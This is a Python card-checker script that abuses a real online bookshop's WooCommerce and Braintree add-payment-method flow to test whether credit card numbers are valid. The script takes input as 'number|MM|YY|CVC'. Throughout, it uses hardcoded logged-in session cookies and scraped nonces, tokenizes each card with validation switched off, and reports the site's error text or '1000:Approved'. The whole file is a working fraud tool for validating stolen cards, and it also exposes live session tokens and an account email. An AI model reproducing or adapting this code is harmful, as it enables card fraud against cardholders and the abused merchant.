import time
import requests,re
from bs4 import BeautifulSoup
import requests
import base64
import re
import random




def Gele(ccx):
    ccx = ccx.strip()
    
    # Step 1: Parse CC Details
    try:
        n, mm, yy, cvc = ccx.split("|")
    except ValueError:
        print("Invalid card format. Use: '1234567890123456|MM|YY|CVC'")
        return None


    koi = 'remeki5997%7C1757414483%7CoBi90QfnxRXkJ7z2sYoZ0zNXvlNdXBmLLP4XDNxqwYg%7C8ab881e3e8012e4acc920fe6be474f1988cd05ff255511d077d7b63d2da9f544'

    cookies = {
    '_ga': 'GA1.1.1552341977.1748783838',
    'et_bloom_optin_optin_1_c4644da967_imp': 'true',
    'mailchimp_landing_site': 'https%3A%2F%2Fwww.windhorsepublications.com%2Fmy-account%2Fadd-payment-method%2F',
    'etBloomCookie_optin_1': 'true',
    'mailchimp_user_previous_email': 'remeki5997%40aravites.com',
    'mailchimp_user_email': 'remeki5997%40aravites.com',
    'cookie_notice_accepted': 'false',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2025-08-10%2003%3A55%3A10%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.windhorsepublications.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2025-08-10%2003%3A55%3A10%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.windhorsepublications.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F137.0.0.0%20Mobile%20Safari%2F537.36',
    'mailchimp.cart.current_email': 'remeki5997@aravites.com',
    '_gcl_au': '1.1.1073672641.1748783837.519822914.1754799949.1754799971',
    'PHPSESSID': '3236329c231060d3d7e8303acb9e9726',
    'wordpress_logged_in_e51f0ec750d984778eada43421443aa3': koi,
    'wp_woocommerce_session_e51f0ec750d984778eada43421443aa3': '26199%7C1754972772%7C1754886372%7C%24generic%242k7hD1rDvSNnjGgeNJfMLsfCqf1i7oj2_a3Tj-vL',
    '_ga_7FLK339XP5': 'GS2.1.s1754799911$o10$g1$t1754800003$j60$l0$h0',
    'sbjs_session': 'pgs%3D5%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.windhorsepublications.com%2Fmy-account%2Fpayment-methods%2F',
}

    headers = {
    'authority': 'www.windhorsepublications.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,de;q=0.6',
    
    'referer': 'https://www.windhorsepublications.com/my-account/payment-methods/',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
}

    response = requests.get(
    'https://www.windhorsepublications.com/my-account/add-payment-method/',
    cookies=cookies,
    headers=headers,
)




    time.sleep(2)


# Use regex to find the "client_token_nonce"
    # Extract client_token_nonce (for "credit_card")
    match_token = re.search(r'"type"\s*:\s*"credit_card"\s*,\s*"client_token_nonce"\s*:\s*"([^"]+)"', response.text)

# Extract hidden nonce value from input tag
    match_nonce = re.search(
    r'<input[^>]+id="woocommerce-add-payment-method-nonce"[^>]+value="([^"]+)"', 
    response.text
)

# Process results
    if match_token:
        card_nonce = match_token.group(1)
        print("Card nonce:", card_nonce)
    else:
        print("Card nonce not found.")

    if match_nonce:
        add_nonce = match_nonce.group(1)
        print("Add nonce:", add_nonce)
    else:
        print("Add nonce not found.")

    cookies = {
    'wordpress_sec_e51f0ec750d984778eada43421443aa3': 'remeki5997%7C1756009572%7C1jpLbJGOsHfrLobM7PgngnQyHyepG6Tx65Ttzas0FHe%7C69a214521568510c44922ebd3cbed1db48979c478481255c64820fa49f265b8e',
    '_ga': 'GA1.1.1552341977.1748783838',
    'et_bloom_optin_optin_1_c4644da967_imp': 'true',
    'mailchimp_landing_site': 'https%3A%2F%2Fwww.windhorsepublications.com%2Fmy-account%2Fadd-payment-method%2F',
    'etBloomCookie_optin_1': 'true',
    'mailchimp_user_previous_email': 'remeki5997%40aravites.com',
    'mailchimp_user_email': 'remeki5997%40aravites.com',
    'cookie_notice_accepted': 'false',
    '_gcl_au': '1.1.1073672641.1748783837.519822914.1754799949.1754799971',
    'wordpress_logged_in_e51f0ec750d984778eada43421443aa3': koi,
    'wp_woocommerce_session_e51f0ec750d984778eada43421443aa3': '26199%7C1754972772%7C1754886372%7C%24generic%242k7hD1rDvSNnjGgeNJfMLsfCqf1i7oj2_a3Tj-vL',
    '_ga_7FLK339XP5': 'GS2.1.s1754799911$o10$g1$t1754800003$j60$l0$h0',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2025-08-10%2004%3A34%3A57%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.windhorsepublications.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.windhorsepublications.com%2Fmy-account%2Fadd-payment-method%2F',
    'sbjs_first_add': 'fd%3D2025-08-10%2004%3A34%3A57%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.windhorsepublications.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.windhorsepublications.com%2Fmy-account%2Fadd-payment-method%2F',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F137.0.0.0%20Mobile%20Safari%2F537.36',
    'sbjs_session': 'pgs%3D3%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.windhorsepublications.com%2Fmy-account%2Fadd-payment-method%2F',
}

    headers = {
    'authority': 'www.windhorsepublications.com',
    'accept': '*/*',
    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,de;q=0.6',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    
    'origin': 'https://www.windhorsepublications.com',
    'referer': 'https://www.windhorsepublications.com/my-account/add-payment-method/',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

    

    data = {
    'action': 'wc_braintree_credit_card_get_client_token',
    'nonce': card_nonce,
}

    response = requests.post(
    'https://www.windhorsepublications.com/wp-admin/admin-ajax.php',
    cookies=cookies,
    headers=headers,
    data=data,
)

    enc = response.json().get('data', '')
    dec = base64.b64decode(enc).decode('utf-8')

    matches = re.findall(r'"authorizationFingerprint":"(.*?)"', dec)

    au = matches[0]
    if matches:
        print("Authorization Fingerprint:", au)
    else:
        print("not found")
    


    time.sleep(2)


    headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,de;q=0.6',
    'authorization': f'Bearer {au}',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
}

    json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': '0f687671-54db-4f6a-82f3-3f4367635a97',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': n,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}

    response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)



# Parse JSON from the response
    try:
        response_json = response.json()
    
        token = response_json["data"]["tokenizeCreditCard"]["token"]
        brand_code = response_json["data"]["tokenizeCreditCard"]["creditCard"]["brandCode"]
    
        print("Token:", token)
        print("Brand Code:", brand_code)
    except (KeyError, TypeError, ValueError):
        print("Not found")
    
                

    time.sleep(2)

    cookies = {
    '_ga': 'GA1.1.1552341977.1748783838',
    'et_bloom_optin_optin_1_c4644da967_imp': 'true',
    'mailchimp_landing_site': 'https%3A%2F%2Fwww.windhorsepublications.com%2Fmy-account%2Fadd-payment-method%2F',
    'etBloomCookie_optin_1': 'true',
    'mailchimp_user_previous_email': 'remeki5997%40aravites.com',
    'mailchimp_user_email': 'remeki5997%40aravites.com',
    'cookie_notice_accepted': 'false',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2025-08-10%2003%3A55%3A10%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.windhorsepublications.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2025-08-10%2003%3A55%3A10%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.windhorsepublications.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F137.0.0.0%20Mobile%20Safari%2F537.36',
    'mailchimp.cart.current_email': 'remeki5997@aravites.com',
    '_gcl_au': '1.1.1073672641.1748783837.519822914.1754799949.1754799971',
    'PHPSESSID': '3236329c231060d3d7e8303acb9e9726',
    'wordpress_logged_in_e51f0ec750d984778eada43421443aa3': koi,
    'wp_woocommerce_session_e51f0ec750d984778eada43421443aa3': '26199%7C1754972772%7C1754886372%7C%24generic%242k7hD1rDvSNnjGgeNJfMLsfCqf1i7oj2_a3Tj-vL',
    '_ga_7FLK339XP5': 'GS2.1.s1754799911$o10$g1$t1754800003$j60$l0$h0',
    'sbjs_session': 'pgs%3D7%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.windhorsepublications.com%2Fmy-account%2Fadd-payment-method%2F',
}

    headers = {
    'authority': 'www.windhorsepublications.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,de;q=0.6',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    
    'origin': 'https://www.windhorsepublications.com',
    'referer': 'https://www.windhorsepublications.com/my-account/add-payment-method/',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
}

    data = [
    ('payment_method', 'braintree_credit_card'),
    ('wc-braintree-credit-card-card-type', brand_code),
    ('wc-braintree-credit-card-3d-secure-enabled', ''),
    ('wc-braintree-credit-card-3d-secure-verified', ''),
    ('wc-braintree-credit-card-3d-secure-order-total', '0.00'),
    ('wc_braintree_credit_card_payment_nonce', token),
    ('wc_braintree_device_data', '{"correlation_id":"04fbc39312d4a5bfe752ffc37bf81b8c"}'),
    ('wc-braintree-credit-card-tokenize-payment-method', 'true'),
    ('wc_braintree_paypal_payment_nonce', ''),
    ('wc_braintree_device_data', '{"correlation_id":"04fbc39312d4a5bfe752ffc37bf81b8c"}'),
    ('wc-braintree-paypal-context', 'shortcode'),
    ('wc_braintree_paypal_amount', '0.00'),
    ('wc_braintree_paypal_currency', 'GBP'),
    ('wc_braintree_paypal_locale', 'en_gb'),
    ('wc-braintree-paypal-tokenize-payment-method', 'true'),
    ('woocommerce-add-payment-method-nonce', add_nonce),
    ('_wp_http_referer', '/my-account/add-payment-method/'),
    ('woocommerce_add_payment_method', '1'),
]

    response = requests.post(
    'https://www.windhorsepublications.com/my-account/add-payment-method/',
    cookies=cookies,
    headers=headers,
    data=data,
)

    match = re.search(
    r'<ul class="woocommerce-error"[^>]*?>\s*<li>\s*(.*?)\s*</li>',
    response.text,
    re.DOTALL
)

# Result print karna
    if match:
        print(match.group(1).strip())
        return match.group(1).strip()
    else:
        print("1000:Approved")
        return "1000:Approved"                            

                                                    
                                                                                                        
                                                                                                                                                                                                         